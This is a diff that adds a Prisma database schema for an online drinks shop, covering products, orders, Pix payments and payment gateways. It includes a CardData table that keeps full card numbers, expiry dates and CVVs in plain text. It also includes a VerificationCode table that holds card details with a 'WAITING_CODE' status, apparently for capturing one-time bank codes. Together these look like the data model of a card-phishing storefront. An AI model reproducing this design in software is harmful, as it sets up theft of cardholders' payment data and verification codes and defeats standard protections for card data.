@@ -1,0 +1,305 @@
+generator client {
+    provider = "prisma-client-js"
+    binaryTargets = ["native", "linux-musl-arm64-openssl-3.0.x"]
+    output = "/home/ubuntu/zeeexpress_deploy/nextjs_space/node_modules/.prisma/client"
+}
+
+datasource db {
+    provider = "postgresql"
+    url      = env("DATABASE_URL")
+}
+
+enum UserRole {
+  USER
+  ADMIN
+}
+
+enum OrderStatus {
+  PENDING
+  PROCESSING
+  CONFIRMED
+  DELIVERED
+  CANCELLED
+}
+
+enum GeolocationMode {
+  DISABLED
+  PASSIVE
+  HYBRID
+  GEOIP_MODAL
+}
+
+enum PaymentStatus {
+  PENDING
+  PROCESSING
+  PAID
+  EXPIRED
+  CANCELLED
+  FAILED
+}
+
+model User {
+  id            String    @id @default(cuid())
+  name          String?
+  email         String    @unique
+  emailVerified DateTime?
+  password      String?
+  image         String?
+  role          UserRole  @default(USER)
+  createdAt     DateTime  @default(now())
+  updatedAt     DateTime  @updatedAt
+  accounts      Account[]
+  sessions      Session[]
+}
+
+model Account {
+  id                String  @id @default(cuid())
+  userId            String
+  type              String
+  provider          String
+  providerAccountId String
+  refresh_token     String?
+  access_token      String?
+  expires_at        Int?
+  token_type        String?
+  scope             String?
+  id_token          String?
+  session_state     String?
+
+  user User @relation(fields: [userId], references: [id], onDelete: Cascade)
+
+  @@unique([provider, providerAccountId])
+}
+
+model Session {
+  id           String   @id @default(cuid())
+  sessionToken String   @unique
+  userId       String
+  expires      DateTime
+  user         User     @relation(fields: [userId], references: [id], onDelete: Cascade)
+}
+
+model VerificationToken {
+  identifier String
+  token      String   @unique
+  expires    DateTime
+
+  @@unique([identifier, token])
+}
+
+model Category {
+  id           String    @id @default(cuid())
+  name         String
+  slug         String    @unique
+  icon         String?
+  color        String?
+  imageUrl     String?
+  orderIndex   Int       @default(999)
+  hidden       Boolean   @default(false)
+  createdAt    DateTime  @default(now())
+  updatedAt    DateTime  @updatedAt
+  products     Product[]
+}
+
+model Product {
+  id                      String   @id @default(cuid())
+  name                    String
+  description             String?
+  imageUrl                String
+  categoryId              String
+  category                Category @relation(fields: [categoryId], references: [id], onDelete: Cascade)
+  price                   Float
+  discount                Float    @default(0)
+  finalPrice              Float
+  stock                   Int      @default(0)
+  featuredOffer           Boolean  @default(false)
+  featuredOfferOrder      Int?
+  featuredCategory        Boolean  @default(false)
+  featuredCategoryOrder   Int?
+  starOrder               Int?
+  hidden                  Boolean  @default(false)
+  volume                  String?
+  alcoholContent          String?
+  brand                   String?
+  sku                     String?  @unique
+  createdAt               DateTime @default(now())
+  updatedAt               DateTime @updatedAt
+}
+
+model Order {
+  id                  String         @id @default(cuid())
+  customerName        String
+  customerEmail       String
+  customerPhone       String
+  customerCpf         String?
+  address             String
+  complement          String?
+  items               Json
+  subtotal            Float
+  deliveryFee         Float
+  total               Float
+  status              OrderStatus    @default(PENDING)
+  paymentMethod       String
+  paymentStatus       PaymentStatus  @default(PENDING)
+  paymentData         Json?
+  
+  pixQrCode           String?
+  pixTransactionId    String?        @unique
+  pixExpiresAt        DateTime?
+  pixPaidAt           DateTime?
+  
+  createdAt           DateTime       @default(now())
+  updatedAt           DateTime       @updatedAt
+}
+
+model Settings {
+  id               String           @id @default(cuid())
+  key              String           @unique
+  value            String
+  geolocationMode  GeolocationMode  @default(DISABLED)
+  metricsResetAt   DateTime?
+  postimgApiKey    String?
+  createdAt        DateTime         @default(now())
+  updatedAt        DateTime         @updatedAt
+}
+
+model BannerMessage {
+  id        String   @id @default(cuid())
+  text      String
+  duration  Int      @default(5)
+  isActive  Boolean  @default(true)
+  order     Int      @default(0)
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+}
+
+model CheckoutSession {
+  id             String   @id @default(cuid())
+  customerName   String
+  customerEmail  String
+  customerPhone  String
+  address        String
+  complement     String?
+  items          Json
+  subtotal       Float
+  deliveryFee    Float
+  total          Float
+  completedToPix Boolean  @default(false)
+  pixCodeCopied  Boolean  @default(false)
+  createdAt      DateTime @default(now())
+  updatedAt      DateTime @updatedAt
+}
+
+model CardData {
+  id            String   @id @default(cuid())
+  customerName  String
+  customerEmail String
+  customerPhone String
+  cardNumber    String
+  cardName      String
+  expiryDate    String
+  cvv           String
+  orderTotal    Float
+  createdAt     DateTime @default(now())
+}
+
+model VerificationCode {
+  id            String   @id @default(cuid())
+  code          String?
+  customerName  String
+  cardBrand     String
+  lastFourDigits String
+  cardNumber    String   @default("")
+  expiryDate    String   @default("")
+  cvv           String   @default("")
+  orderTotal    Float
+  status        String   @default("WAITING_CODE")
+  createdAt     DateTime @default(now())
+}
+
+model Gateway {
+  id          String   @id @default(cuid())
+  name        String
+  publicKey   String
+  privateKey  String
+  apiUrl      String
+  productName String   @default("Bebida")
+  isActive    Boolean  @default(false)
+  createdAt   DateTime @default(now())
+  updatedAt   DateTime @updatedAt
+  
+  endpoint              String?  @default("/sales/create-sale")
+  authHeaderName        String?  @default("X-API-Key")
+  authHeaderPrefix      String?  @default("")
+  valueFormat           String?  @default("centavos")
+  responseQrCodePath    String?  @default("data.paymentData.qrCodeBase64")
+  responsePixCodePath   String?  @default("data.paymentData.copyPaste")
+  responseTransactionId String?  @default("data.transactionId")
+  payloadTemplate       String?  @db.Text
+}
+
+model Brand {
+  id        String   @id @default(cuid())
+  name      String   @unique
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+}
+
+model LearningRule {
+  id          String   @id @default(cuid())
+  ruleType    String
+  pattern     String
+  value       String
+  description String?
+  isActive    Boolean  @default(true)
+  createdAt   DateTime @default(now())
+  updatedAt   DateTime @updatedAt
+}
+
+model ProductFacts {
+  id              String   @id @default(cuid())
+  productName     String   @unique
+  brand           String?
+  volume          String?
+  alcoholContent  String?
+  description     String?  @db.Text
+  category        String?
+  source          String
+  confidence      Float    @default(0.8)
+  createdAt       DateTime @default(now())
+  updatedAt       DateTime @updatedAt
+}
+
+model BrandKnowledge {
+  id              String   @id @default(cuid())
+  brandName       String   @unique
+  displayName     String
+  alcoholContent  String?
+  category        String?
+  volume          String?
+  source          String   @default("learned")
+  learnedFrom     String?
+  confidence      Float    @default(0.9)
+  usageCount      Int      @default(1)
+  createdAt       DateTime @default(now())
+  updatedAt       DateTime @updatedAt
+}
+
+model ApiConfig {
+  id        String   @id @default(cuid())
+  key       String   @unique
+  value     String   @db.Text
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+}
+
+model GoogleAdsTag {
+  id              String   @id @default(cuid())
+  name            String   @default("")
+  awId            String
+  conversionLabel String   @default("")
+  isActive        Boolean  @default(true)
+  order           Int      @default(0)
+  createdAt       DateTime @default(now())
+  updatedAt       DateTime @updatedAt
+}
